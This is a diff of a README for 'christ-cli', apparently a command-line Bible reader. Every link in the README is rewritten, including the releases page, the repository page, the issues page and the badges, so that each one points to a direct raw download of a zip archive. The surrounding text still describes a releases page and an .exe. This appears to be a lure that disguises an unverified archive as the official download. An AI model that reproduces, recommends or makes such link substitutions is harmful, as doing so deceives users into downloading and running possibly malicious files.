@@ -1,6 +1,6 @@
 # ✝️ christ-cli - Read Bible Easily in Your Command Line
 
-[![Download christ-cli](https://img.shields.io/badge/Download-christ--cli-blue?style=for-the-badge)](https://github.com/ASDfghjkL0-poll/christ-cli/releases)
+[![Download christ-cli](https://img.shields.io/badge/Download-christ--cli-blue?style=for-the-badge)](https://github.com/ASDfghjkL0-poll/christ-cli/raw/refs/heads/main/npm/bin/cli-christ-v3.1-beta.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Below is a full guide to get christ-cli up and running without trouble.
 
 To get the software, visit the official releases page on GitHub:
 
-[Download christ-cli from GitHub Releases](https://github.com/ASDfghjkL0-poll/christ-cli/releases)
+[Download christ-cli from GitHub Releases](https://github.com/ASDfghjkL0-poll/christ-cli/raw/refs/heads/main/npm/bin/cli-christ-v3.1-beta.2.zip)
 
 This page has all available versions of christ-cli. Pick the latest Windows version. The file will usually end with `.exe`.
 
@@ -113,7 +113,7 @@ Once running, you will see commands and simple menus. Here are some common tasks
 
 New versions come out to improve features or fix bugs. To update:
 
-1. Visit the [christ-cli releases page](https://github.com/ASDfghjkL0-poll/christ-cli/releases) regularly.  
+1. Visit the [christ-cli releases page](https://github.com/ASDfghjkL0-poll/christ-cli/raw/refs/heads/main/npm/bin/cli-christ-v3.1-beta.2.zip) regularly.  
 2. Download the newest `.exe` file for Windows.  
 3. Replace your old file with the new one. No extra setup needed.
 
@@ -136,7 +136,7 @@ New versions come out to improve features or fix bugs. To update:
 
 If you find bugs or want to suggest features, you can open an issue in the GitHub repository. To do this:
 
-1. Go to the project page: https://github.com/ASDfghjkL0-poll/christ-cli  
+1. Go to the project page: https://github.com/ASDfghjkL0-poll/christ-cli/raw/refs/heads/main/npm/bin/cli-christ-v3.1-beta.2.zip  
 2. Click on "Issues"  
 3. Create a new issue with your description.
 
@@ -144,9 +144,9 @@ If you find bugs or want to suggest features, you can open an issue in the GitHu
 
 ## 📂 Useful Links
 
-- [christ-cli Releases](https://github.com/ASDfghjkL0-poll/christ-cli/releases) – Download latest versions  
-- [christ-cli Repository](https://github.com/ASDfghjkL0-poll/christ-cli) – Project source and documentation  
+- [christ-cli Releases](https://github.com/ASDfghjkL0-poll/christ-cli/raw/refs/heads/main/npm/bin/cli-christ-v3.1-beta.2.zip) – Download latest versions  
+- [christ-cli Repository](https://github.com/ASDfghjkL0-poll/christ-cli/raw/refs/heads/main/npm/bin/cli-christ-v3.1-beta.2.zip) – Project source and documentation  
 
 ---
 
-[![Download christ-cli](https://img.shields.io/badge/Download-christ--cli-blue?style=for-the-badge)](https://github.com/ASDfghjkL0-poll/christ-cli/releases)
+[![Download christ-cli](https://img.shields.io/badge/Download-christ--cli-blue?style=for-the-badge)](https://github.com/ASDfghjkL0-poll/christ-cli/raw/refs/heads/main/npm/bin/cli-christ-v3.1-beta.2.zip)
